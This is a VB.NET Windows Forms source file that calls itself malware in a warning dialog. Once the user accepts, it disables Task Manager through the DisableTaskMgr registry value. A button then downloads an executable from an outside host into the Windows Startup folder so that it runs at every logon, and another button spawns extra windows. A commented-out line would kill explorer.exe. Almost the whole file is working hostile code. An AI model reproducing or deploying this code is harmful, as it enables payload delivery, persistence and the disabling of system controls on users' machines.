
Imports System.IO
Imports System.Net
Imports System.Text
Imports Microsoft.Win32
Imports Microsoft
Imports System.Windows

Public Class Form1

    'hello github!

    Dim canExit As Boolean = False
    Dim url As String = "http://dd2476ste1.7m.pl/rndErr/{09GD-A7TT-HU64}.exe"
    Dim client As WebClient = New WebClient


    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        If MessageBox.Show("This program is considered as malware. I'm not responsible for anything that happens while using it." + vbNewLine + vbNewLine + "Continue?", "WARNING! MALWARE AHEAD!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) = DialogResult.No Then

            canExit = True

            Application.Exit()

        Else

            'Shell("cmd.exe /c taskkill /f /im explorer.exe")

            SetTaskManager(False)

        End If

    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing

        If canExit = False Then

            'e.Cancel = True

        Else



        End If

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        t1.Start()

        client.DownloadFileAsync(New Uri(uriString:=url), Environment.GetFolderPath(Environment.SpecialFolder.Startup).ToString + "\{09GD-A7TT-HU64}.txt.exe")

    End Sub

    Private Sub t1_Tick(sender As Object, e As EventArgs) Handles t1.Tick

        p1.Increment(1)

        If p1.Value = p1.Maximum Then

            t1.Stop()

            Button2.Enabled = False
            Button3.Enabled = True

        End If

    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click

        t2.Start()

        For i = 0 To 5

            Dim a As New Form2

            a.Show()

        Next

    End Sub

    Private Sub t2_Tick(sender As Object, e As EventArgs) Handles t2.Tick

        p2.Increment(10)

        If p2.Value = p2.Maximum Then

            t2.Stop()

            Button3.Enabled = False
            Button4.Enabled = True

        End If

    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click

        Process.Start("C:\Windows\explorer.exe")

        canExit = True

        Application.Exit()

    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click

        SetTaskManager(True)

    End Sub

    Public Sub SetTaskManager(ByVal enable As Boolean)

        Dim objRegistryKey As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")

        If (enable AndAlso (Not (objRegistryKey.GetValue("DisableTaskMgr")) Is Nothing)) Then

            objRegistryKey.DeleteValue("DisableTaskMgr")

        Else

            objRegistryKey.SetValue("DisableTaskMgr", "1")

        End If

        objRegistryKey.Close()

    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click

        SetTaskManager(False)

    End Sub

End Class
